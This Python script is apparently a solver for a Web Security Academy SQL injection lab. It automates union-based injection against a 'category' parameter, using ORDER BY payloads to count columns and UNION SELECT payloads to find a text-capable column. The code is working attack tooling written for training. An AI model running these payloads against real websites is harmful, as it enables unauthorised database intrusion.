# src/sqli/lab04.py
from __future__ import annotations

import argparse
import sys

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi Lab04: Determine number of columns and which column accepts string data."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # where/how to inject
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter to inject (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value", default="Gifts", help="Benign parameter value (default: %(default)s)"
    )
    _ = p.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method (default: %(default)s)",
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to put payload (default: %(default)s)",
    )

    # detection
    _ = p.add_argument(
        "--error-marker",
        default="Internal Server Error",
        help="Substring that indicates an error page (default: %(default)s)",
    )
    _ = p.add_argument(
        "--expect-ok-status",
        type=int,
        default=200,
        help="HTTP status considered OK/normal (default: %(default)s)",
    )

    # search bounds
    _ = p.add_argument(
        "--start", type=int, default=1, help="Start column index (default: %(default)s)"
    )
    _ = p.add_argument(
        "--max", type=int, default=50, help="Max columns to try (default: %(default)s)"
    )

    # string test
    _ = p.add_argument(
        "--marker-string",
        default="v2F6UA",
        help="String literal used for union-select test (default: %(default)s)",
    )

    # plumbing
    _ = p.add_argument("--proxy", default=None, help="Proxy (e.g. http://127.0.0.1:8080)")
    _ = p.add_argument(
        "--insecure", action="store_true", help="Disable TLS verification (useful with Burp)."
    )
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds (default: %(default)s)"
    )

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


def find_column_count(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
    start: int,
    max_try: int,
    expect_ok_status: int | None,
    error_marker: str | None,
) -> int | None:
    """Return number of columns or None if not found."""
    for i in range(start, max_try + 1):
        payload = f"{base_value}' ORDER BY {i}-- -"
        res = sqli_inject(
            client,
            payload=payload,
            method=method,
            endpoint=endpoint,
            inject=inject,
            param_name=param_name,
            base_params=base_params,
            extra_headers=headers,
            cookies=cookies,
            expect_status=expect_ok_status,
        )

        # Detect server error
        status_ok = (expect_ok_status is None) or (res.status_code == expect_ok_status)
        body_has_error = bool(error_marker) and (error_marker in (res.evidence_excerpt or ""))
        if (not status_ok) or body_has_error:
            return i - 1 if i > start else 0
    return None


def find_string_column(
    client: HttpClient,
    *,
    num_columns: int,
    endpoint: str,
    param_name: str,
    base_value: str,
    marker_string: str,
    method: str,
    inject: str,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> int | None:
    """Return the index (1-based) of the column that can hold string data, or None if not found."""
    for i in range(1, num_columns + 1):
        payload_parts = ["NULL"] * num_columns
        payload_parts[i - 1] = f"'{marker_string}'"
        union_clause = ", ".join(payload_parts)
        payload = f"{base_value}' UNION SELECT {union_clause}-- -"

        res = sqli_inject(
            client,
            payload=payload,
            method=method,
            endpoint=endpoint,
            inject=inject,
            param_name=param_name,
            base_params=base_params,
            extra_headers=headers,
            cookies=cookies,
        )

        if res.success:
            return i
    return None


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    print("[+] Determining the number of columns...")
    try:
        num_col = find_column_count(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
            start=args.start,
            max_try=args.max,
            expect_ok_status=args.expect_ok_status,
            error_marker=args.error_marker,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if not num_col:
        print("[-] Unable to determine column count.")
        return 1

    print(f"[+] The number of columns is {num_col}.")
    print("[+] Probing which column can hold text data...")

    string_col = find_string_column(
        client,
        num_columns=num_col,
        endpoint=args.endpoint,
        param_name=args.param_name,
        base_value=args.base_value,
        marker_string=args.marker_string,
        method=args.method,
        inject=args.inject,
        base_params=base_params,
        cookies=cookies,
        headers=headers,
    )

    if string_col:
        print(f"[+] Column {string_col} can hold string data.")
        return 0
    else:
        print("[-] Could not identify a string column.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))


# Usage example
# python -m src.sqli.lab04 \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Gifts \
# --proxy http://127.0.0.1:8080 \
# --insecure
